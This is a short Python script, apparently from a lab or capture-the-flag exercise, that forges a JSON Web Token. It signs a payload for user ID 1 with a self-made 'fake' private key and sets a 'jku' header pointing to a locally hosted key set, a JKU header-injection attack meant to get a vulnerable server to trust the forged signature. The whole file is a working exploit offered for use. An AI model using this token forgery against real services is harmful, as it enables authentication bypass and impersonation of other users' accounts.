import jwt
from datetime import datetime, timedelta

# Load the fake private key
with open("private.pem", "r") as f:
    fake_private_key = f.read()


print(fake_private_key)
payload = {
  "user_id": 1,
  "exp": 1710172573,
  "iat": 1710168973
}

headers = {
    "jku": "http://127.0.0.1:8888/fake_jwks.json"
}

# Create the token
token = jwt.encode(payload, fake_private_key, algorithm="RS256", headers=headers)

print(token)
